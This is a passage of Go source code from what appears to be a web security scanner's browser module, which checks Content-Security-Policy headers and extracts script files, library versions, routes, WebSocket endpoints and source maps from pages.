		if val != "'none'" {
			findings = append(findings, &models.Finding{
				Title:       "Browser - CSP object-src Not Restricted",
				Severity:    models.Medium,
				Confidence:  models.MediumConfidence,
				URL:         targetURL,
				Evidence:    fmt.Sprintf("CSP object-src: %s", val),
				Description: "CSP object-src directive is not set to 'none', allowing plugin-based attacks.",
				Remediation: "Set object-src 'none' in CSP to prevent plugin-based attacks.",
				CWEID:       "CWE-693",
				ModuleID:    "browser",
			})
		}
	}

	if _, ok := directives["frame-ancestors"]; !ok {
		findings = append(findings, &models.Finding{
			Title:       "Browser - CSP Missing frame-ancestors",
			Severity:    models.Medium,
			Confidence:  models.MediumConfidence,
			URL:         targetURL,
			Evidence:    "CSP does not include frame-ancestors directive",
			Description: "CSP is missing the frame-ancestors directive, which could allow framing for clickjacking.",
			Remediation: "Add 'frame-ancestors' none' or 'self' to CSP to prevent clickjacking.",
			CWEID:       "CWE-1021",
			ModuleID:    "browser",
		})
	}

	return findings
}

func parseCSP(csp string) map[string]string {
	directives := make(map[string]string)
	parts := strings.Split(csp, ";")
	for _, part := range parts {
		part = strings.TrimSpace(part)
		if part == "" {
			continue
		}
		tokens := strings.SplitN(part, " ", 2)
		if len(tokens) >= 1 {
			name := strings.TrimSpace(tokens[0])
			value := ""
			if len(tokens) >= 2 {
				value = strings.TrimSpace(tokens[1])
			}
			directives[name] = value
		}
	}
	return directives
}

func extractJSFiles(body string) []string {
	var files []string
	re := regexp.MustCompile(`<script[^>]*src=["']([^"']+)["']`)
	matches := re.FindAllStringSubmatch(body, -1)
	for _, m := range matches {
		if len(m) > 1 {
			files = append(files, m[1])
		}
	}
	re2 := regexp.MustCompile(`(?:import|require)\s*\(\s*["']([^"']+\.(?:js|mjs))["']`)
	matches2 := re2.FindAllStringSubmatch(body, -1)
	for _, m := range matches2 {
		if len(m) > 1 {
			files = append(files, m[1])
		}
	}
	return files
}

func detectLibraryVersion(jsContent, jsURL string) string {
	patterns := map[string]*regexp.Regexp{
		"jquery":    regexp.MustCompile(`jQuery\s*v?([\d.]+)|jquery-([\d.]+)\.min\.js`),
		"angular":   regexp.MustCompile(`angular\s*v?([\d.]+)|angular-?([\d.]+)\.min\.js`),
		"react":     regexp.MustCompile(`React\s*v?([\d.]+)|react(-dom)?\.([\d.]+)\.min\.js`),
		"vue":       regexp.MustCompile(`Vue\s*v?([\d.]+)|vue\.([\d.]+)\.min\.js`),
		"bootstrap": regexp.MustCompile(`Bootstrap\s*v?([\d.]+)|bootstrap\.([\d.]+)\.min\.js`),
		"lodash":    regexp.MustCompile(`lodash\s*v?([\d.]+)|lodash\.([\d.]+)\.min\.js`),
		"moment":    regexp.MustCompile(`moment\s*v?([\d.]+)|moment\.([\d.]+)\.min\.js`),
	}
	for name, re := range patterns {
		matches := re.FindStringSubmatch(jsContent)
		if len(matches) > 1 {
			for _, m := range matches[1:] {
				if m != "" {
					return name + "@" + m
				}
			}
		}
	}
	urlPattern := regexp.MustCompile(`/([^/]+)@?(\d+\.\d+\.\d+)/[^/]+\.(?:js|mjs)`)
	urlMatches := urlPattern.FindStringSubmatch(jsURL)
	if len(urlMatches) > 2 {
		return urlMatches[1] + "@" + urlMatches[2]
	}
	return ""
}

func checkVulnerableLibrary(jsURL, version string) string {
	if version == "" {
		return ""
	}
	parts := strings.SplitN(version, "@", 2)
	if len(parts) != 2 {
		return ""
	}
	name := strings.ToLower(parts[0])
	ver := parts[1]

	vulnVersions, ok := vulnJSLibs[name]
	if !ok {
		return ""
	}
	for _, v := range vulnVersions {
		if v == ver {
			return fmt.Sprintf("%s@%s is potentially vulnerable", name, ver)
		}
	}
	return ""
}

func detectSPARoutes(body string) []string {
	var routes []string
	patterns := []*regexp.Regexp{
		regexp.MustCompile(`route\s*:\s*["']([^"']+)["']`),
		regexp.MustCompile(`path\s*:\s*["']([^"']+)["']`),
		regexp.MustCompile(`router\.(?:get|post|put|delete|patch)\s*\(\s*["']([^"']+)["']`),
		regexp.MustCompile(`\.when\s*\(\s*["']([^"']+)["']`),
		regexp.MustCompile(`url\s*:\s*["']([^"']+)["']`),
		regexp.MustCompile(`endpoint\s*:\s*["']([^"']+)["']`),
	}
	seen := make(map[string]bool)
	for _, re := range patterns {
		matches := re.FindAllStringSubmatch(body, -1)
		for _, m := range matches {
			if len(m) > 1 {
				r := m[1]
				if !seen[r] && !strings.HasPrefix(r, "#") && !strings.HasPrefix(r, "http") {
					seen[r] = true
					routes = append(routes, r)
				}
			}
		}
	}
	return routes
}

func detectAutofill(body string) []string {
	var fields []string
	re := regexp.MustCompile(`<input[^>]*autocomplete=["']([^"']+)["']`)
	matches := re.FindAllStringSubmatch(body, -1)
	for _, m := range matches {
		if len(m) > 1 && m[1] != "off" {
			fields = append(fields, m[1])
		}
	}
	return fields
}

func extractWebSocketEndpoints(body string) []string {
	var endpoints []string
	idx := 0
	for {
		wsIdx := strings.Index(body[idx:], "ws")
		if wsIdx == -1 {
			break
		}
		start := idx + wsIdx
		if start+2 < len(body) && body[start+2] == ':' {
			end := strings.IndexAny(body[start:], "\"' \t\n\r<>")
			if end == -1 {
				end = len(body) - start
			}
			ep := body[start : start+end]
			if strings.HasPrefix(ep, "ws://") || strings.HasPrefix(ep, "wss://") {
				endpoints = append(endpoints, ep)
			}
			idx = start + end
		} else {
			idx = start + 2
		}
		if idx >= len(body) {
			break
		}
	}
	return endpoints
}

func findSourceMaps(body string) []string {
	var maps []string
	markers := []string{"//# sourceMappingURL=", "/*# sourceMappingURL="}
	for _, marker := range markers {
		idx := 0
		for {
			pos := strings.Index(body[idx:], marker)
			if pos == -1 {
				break
			}
			start := idx + pos + len(marker)
			end := strings.IndexAny(body[start:], "\n\r")
			if end == -1 {
				end = len(body) - start
			}
			maps = append(maps, strings.TrimSpace(body[start:start+end]))
			idx = start + end
		}
	}
	return maps
}

func resolveURL(base, ref string) string {
	if strings.HasPrefix(ref, "http://") || strings.HasPrefix(ref, "https://") {
		return ref
	}
	if strings.HasPrefix(ref, "//") {
		return "https:" + ref
	}
	if strings.HasPrefix(ref, "/") {
		parts := strings.SplitN(base, "/", 4)
		if len(parts) >= 3 {
			return parts[0] + "//" + parts[2] + ref
		}
	}
	lastSlash := strings.LastIndex(base, "/")
	if lastSlash > 8 {
		return base[:lastSlash+1] + ref
	}
	return base + "/" + ref
}

func truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max] + "..."
}

func init() {
	engine.GetRegistry().Register(&BrowserModule{})
}
